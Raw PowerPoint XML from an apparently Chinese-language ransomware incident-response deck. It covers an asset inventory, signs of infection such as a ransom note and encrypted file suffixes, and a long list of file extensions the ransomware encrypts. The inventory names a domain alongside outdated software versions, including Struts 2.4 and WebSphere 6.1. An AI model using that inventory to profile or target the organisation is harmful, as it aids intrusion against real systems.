                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3163607168"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1152128">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2368396185"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1152128">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4122304469"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1008114">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="187338095"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="61436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操作系统版本</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管理后台</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US"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IP</a:t>
                      </a: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地址</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中间件类型</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中间件版本</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数据库类型</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数据库版本</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应用</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US"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URL</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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1710446463"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="615554">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AIX 5.3</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10.xx.xxx.79</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was</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6.1.0.47</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oracle</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V11g</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gmcc.net</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499788466"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="826294">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应用端口</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储存设备类型</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储存设备型号</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web</a:t>
                      </a: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框架</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中间件版本</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第三方组件</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757348776"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="826294">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80</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磁带库</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3584/L52</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struts</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2.4</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编辑器</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3860674538"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32415525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522697-672C-514E-9F6C-A258E1F29913}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="126876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感染文件特征和感染时间</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20482" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971600" y="2420888"/>
            <a:ext cx="757522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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>操作系统</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>桌面是否有新的文本文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>文本文件中是否有详细的加密信息及解密联系方式；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>被加密的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>文件类型</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>加密后的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>文件后缀</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33424291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wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20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1AE058-6BC8-9D49-BBC0-9E50D9B90788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560"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被加密的文件类型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21506" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="611560" y="1916832"/>
            <a:ext cx="828092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en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.der, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pfx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .key, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>crt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csr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .p12, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pem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odt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ott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sxw</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stw</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uot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .3ds, .max, .3dm, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ods</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ots</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sxc</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stc</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dif</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slk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .wb2, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>odp</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otp</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sxd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std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uop</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odg</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otg</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sxm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .mml, .lay, .lay6, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>asc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .sqlite3, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlitedb</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sql</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accdb</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mdb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .dbf, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>odb</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frm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myd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myi</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ibd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mdf</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ldf</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sln</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suo</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cpp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .pas, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>asm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cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .bat, .ps1, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vbs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .dip, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dch</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sch</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brd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jsp</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php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .asp, .java, .jar, .class, .mp3, .wav, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>swf</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fla</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wmv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .mpg, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .mpeg, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>asf</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avi</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mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .mp4, .3gp, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mkv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .3g2, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>flv</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wma</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .mid, .m3u, .m4u, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>djvu</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svg</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psd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nef</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .tiff, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tif</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cgm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .raw, .gif, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>png</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .bmp, .jpg, .jpeg, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vcd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iso</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .backup, .zip, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rar</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tgz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .tar, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bak</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tbk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .bz2, .PAQ, .ARC, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>aes</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gpg</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vmx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vmdk</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vdi</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sldm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sldx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sti</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sxi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .602, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hwp</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snt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .onetoc2, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dwg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .pdf, .wk1, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>wks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .123, .rtf, .csv, .txt, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vsdx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vsd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edb</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eml</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msg</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ost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pst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potm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potx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ppam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ppsx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ppsm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pps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .pot, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
